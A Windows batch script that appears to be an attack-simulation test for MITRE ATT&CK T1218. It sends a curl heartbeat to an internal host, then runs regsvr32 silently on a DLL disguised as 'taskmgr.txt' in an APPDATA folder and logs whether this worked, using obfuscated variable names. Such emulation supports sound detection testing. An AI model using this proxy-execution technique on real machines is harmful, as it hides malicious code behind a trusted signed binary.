@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET douyiw=%APPDATA%\9403\6ae18b72
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?9403-10
SET eykalkg=BALAM-S2B
SET fkesh=10
SET ecrfwq=taskmgr.txt
SET rgnpbq=9403
SET kdtsgb=%APPDATA%\!fkesh!\macula-simulations.log
SET sxwdd=!DATE!/!TIME!
SET mqnw=0
SET jwqcx=

echo [!sxwdd!][DEBUG][!eykalkg!]: script_start>> "!kdtsgb!" 2>nul
echo [!sxwdd!][DEBUG][!eykalkg!]: heartbeat_start>> "!kdtsgb!" 2>nul
curl -k -s -o nul "!frytcn!"
IF !ERRORLEVEL! EQU 0 (
  SET mqnw=1
  echo [!sxwdd!][DEBUG][!eykalkg!]: heartbeat_complete>> "!kdtsgb!" 2>nul
) ELSE (
  SET jwqcx=heartbeat_failed
  echo [!sxwdd!][DEBUG][!eykalkg!]: heartbeat_failed>> "!kdtsgb!" 2>nul
)

SET zkysc=1
SET qnwdx=
echo [!sxwdd!][DEBUG][!eykalkg!]: chdir_start>> "!kdtsgb!" 2>nul
cd /d "!douyiw!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
  SET zkysc=0
  SET qnwdx=chdir_failed
)
echo [!sxwdd!][DEBUG][!eykalkg!]: chdir_result=!zkysc!>> "!kdtsgb!" 2>nul

SET rwdjk=1
SET jcldd=
IF !zkysc! EQU 1 (
  echo [!sxwdd!][DEBUG][!eykalkg!]: regsvr32_start>> "!kdtsgb!" 2>nul
  %WinDir%\System32\regsvr32.exe /s "!ecrfwq!"
  IF !ERRORLEVEL! NEQ 0 (
    SET rwdjk=0
    SET jcldd=dll_load_failed
    echo [!sxwdd!][DEBUG][!eykalkg!]: regsvr32_failed>> "!kdtsgb!" 2>nul
  ) ELSE (
    echo [!sxwdd!][DEBUG][!eykalkg!]: regsvr32_complete>> "!kdtsgb!" 2>nul
  )
) ELSE (
  SET rwdjk=0
  SET jcldd=!qnwdx!
)

SET sxwdd=!DATE!/!TIME!
IF !rwdjk! EQU 1 (
  echo [!sxwdd!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=1:>> "!kdtsgb!" 2>nul
) ELSE (
  echo [!sxwdd!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=0:!jcldd!>> "!kdtsgb!" 2>nul
)

echo [!sxwdd!][DEBUG][!eykalkg!]: script_complete>> "!kdtsgb!" 2>nul